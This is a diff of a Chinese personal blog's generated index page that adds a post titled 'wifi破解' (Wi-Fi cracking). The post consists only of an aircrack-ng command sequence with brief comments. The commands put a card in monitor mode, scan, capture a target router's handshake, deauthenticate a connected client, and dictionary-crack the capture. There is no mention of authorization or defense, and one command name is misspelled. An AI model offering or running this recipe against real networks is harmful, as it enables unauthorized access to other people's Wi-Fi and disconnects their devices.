@@ -99,7 +99,7 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">15</span></a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">16</span></a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
@@ -170,7 +170,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-count">16</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -220,6 +220,90 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/21/wifi%E7%A0%B4%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="Luotao">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Taoの博客">
+      <meta itemprop="description" content="<font color="#FFFFFF">每一个辉煌瞬间的背后都是无数个平凡枯燥的片断支撑起来的。</font>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Taoの博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/04/21/wifi%E7%A0%B4%E8%A7%A3/" class="post-title-link" itemprop="url">wifi破解</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-04-21 10:10:44 / 修改时间：10:11:04" itemprop="dateCreated datePublished" datetime="2023-04-21T10:10:44+08:00">2023-04-21</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//是否支持监听
+arimon-ng
+//开启监听
+airmon-ng start wlan0
+//扫描WIfi
+airodump-ng wlan0mon
+//抓包
+airodump-ng <span class="token parameter variable">-c</span> 信道 <span class="token parameter variable">--bssid</span> 路由器mac <span class="token parameter variable">-w</span> hach wlan0mon
+//踢下线
+aireplay-ng <span class="token parameter variable">-0</span> <span class="token number">10</span> <span class="token parameter variable">-a</span> 路由器mac <span class="token parameter variable">-c</span> 客户机mac wlan0mon
+//跑包
+aircrack-ng <span class="token parameter variable">-w</span> pass.txt hach-07.cap
+aircrack-ng <span class="token parameter variable">-a2</span> <span class="token parameter variable">-b</span> 路由器mac <span class="token parameter variable">-w</span> pass.txt hach-05.cap
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
